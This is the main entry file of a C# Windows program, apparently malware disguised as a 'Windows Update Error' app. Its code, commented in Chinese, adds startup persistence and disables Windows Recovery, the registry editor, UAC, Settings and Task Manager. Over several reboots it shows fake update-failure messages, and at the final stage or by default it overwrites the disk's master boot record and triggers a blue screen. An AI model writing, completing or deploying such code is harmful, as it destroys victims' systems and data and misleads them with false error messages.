using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;

namespace Windows_Update_Error
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            ApplicationConfiguration.Initialize();
            Regedit_Set regedit1 = new Regedit_Set();      //创建Regedit_Set对象
            Test test1 = new Test();          //创建Test对象
            string regedit1_Start = regedit1.Start_Detection();         //获取启动码
            const string str1 = "114514";
            const string str2 = "8479838";
            const string str3 = "7453567";
            const string str4 = "84634846";
            const string str5 = "847327473";
            try
            {
                regedit1.PC_Start();         //添加开机启动项并修改系统关键启动项
                test1.Disable_WinRE();      //禁用Windows恢复环境
                regedit1.Disable_Regedit();           //禁用注册表
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            regedit1.UAC_OFF();         //关闭UAC
            regedit1.Disable_Settings();   //禁用设置和任务管理器
            Thread.Sleep(5000);       //等待5秒
            switch(regedit1_Start)
            {
                case str1:
                    regedit1_Start = "8479838";
                    regedit1.Start_Update(regedit1_Start);     //更新启动码
                    test1.Shutdown_PC();      //重启
                    break;
                case str2:
                    regedit1_Start = regedit1.Start_Detection();    //获取启动码
                    regedit1_Start = "7453567";
                    regedit1.Start_Update(regedit1_Start);
                    msg1();
                    Application.Run(new Form2());
                    break;
                case str3:
                    regedit1_Start = regedit1.Start_Detection();     //获取启动码
                    regedit1_Start = "84634846";
                    regedit1.Start_Update(regedit1_Start);     //更新启动码
                    msg2();
                    Application.Run(new Form2());
                    break;
                case str4:
                    regedit1_Start = regedit1.Start_Detection();       //获取启动码
                    regedit1_Start = "847327473";
                    regedit1.Start_Update(regedit1_Start);          //更新启动码
                    msg3();
                    Application.Run(new Form2());
                    break;
                case str5:
                    test1.killmbrA();     //篡改硬盘的主引导记录MBR
                    //test1.killmbr();
                    test1.Nt_Error();     //蓝屏
                    break;
                default:
                    test1.killmbrA();     //篡改硬盘的主引导记录MBR
                    //test1.killmbr();
                    test1.Nt_Error();     //蓝屏
                    break;
            }
            void msg1()
            {
                MessageBox.Show("更新失败，Windows无法修复你的电脑", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            void msg2()
            {
                MessageBox.Show("由于遇到了未知错误，无法正常加载Windows组件", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            void msg3()
            {
                MessageBox.Show("电脑无法恢复重要的Windows组件", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}